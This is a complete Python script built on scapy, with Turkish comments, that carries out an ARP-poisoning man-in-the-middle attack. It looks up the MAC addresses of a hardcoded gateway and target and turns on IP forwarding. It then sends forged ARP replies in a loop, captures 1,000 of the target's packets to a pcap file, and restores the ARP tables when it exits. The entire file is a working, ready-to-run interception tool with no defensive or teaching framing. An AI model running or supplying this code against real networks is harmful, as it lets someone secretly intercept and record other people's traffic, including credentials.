from scapy.all import *
import os
import signal
import sys
import threading
import time

#ARP Poison parametreleri
gateway_ip = "10.0.0.1"
target_ip = "10.0.0.250"
packet_count = 1000
conf.iface = "en5"
conf.verb = 0

# Verilen bir IP adresi icin MAC adresini aliyoruz.
def get_mac(ip_address):
    # ARP paketi oluşturuldu ve sr fonksiyonu ile Layer 3 de gonderiliyor.
    # Alternatif Metod - Layer 2: resp, unans =  srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip_address))
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
    for s,r in resp:
        return r[ARP].hwsrc
    return None

# Dogru ARP CEVAPLARINI, gecerli MAC ve IP adresleriyle gonderiyoruz
# Amac, Networku eski haline getirmek
def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
    print("[*] IP forwarding pasif")
    # IP Forwarding i kapatiyoruz
    os.system("sysctl -w net.inet.ip.forwarding=0")
    # MAC uzerindeki process i olduruyoruz
    os.kill(os.getpid(), signal.SIGTERM)

# Araya girmek icin SAHTE ARP CEVAPLARI gonderiyoruz
def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] ARP poison saldirisi baslatiliyor.. [CTRL-C]")
    try:
        while True:
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
            time.sleep(2)
    except KeyboardInterrupt:
        print("[*] ARP poison saldirisi durdurulyor. Network eski haline cevriliyor.")
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)

print("[*] Script: arp_poison.py")
print("[*] IP forwarding etkin")
# IP Forwarding i etkin hale getiriyoruz.
os.system("sysctl -w net.inet.ip.forwarding=1")
print(f"[*] Gateway IP adres: {gateway_ip}")
print(f"[*] Hedef IP adres: {target_ip}")

gateway_mac = get_mac(gateway_ip)
if gateway_mac is None:
    print("[!] gateway MAC adresi alinamiyor. Cikiyor..")
    sys.exit(0)
else:
    print(f"[*] Gateway MAC adres: {gateway_mac}")

target_mac = get_mac(target_ip)
if target_mac is None:
    print("[!] Hedef MAC adresi alinamiyor. Cikiyor..")
    sys.exit(0)
else:
    print(f"[*] Hedef MAC adres: {target_mac}")

# ARP Poison threadleri
poison_thread = threading.Thread(target=arp_poison, args=(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

# Trafigi dinleyip dosyaya yaziyoruz.
try:
    sniff_filter = "ip host " + target_ip
    print(f"[*] Paket yakalama basliyor. Paket sayisi: {packet_count}. Filter: {sniff_filter}")
    packets = sniff(filter=sniff_filter, iface=conf.iface, count=packet_count)
    wrpcap(target_ip + "_capture.pcap", packets)
    print(f"[*] Paket yakalama sonlandiriliyor.. Network eski durumuna donuyor.")
    restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
except KeyboardInterrupt:
    print(f"[*] Paket yakalama sonlandiriliyor.. Network eski durumuna donuyor.")
    restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
sys.exit(0)
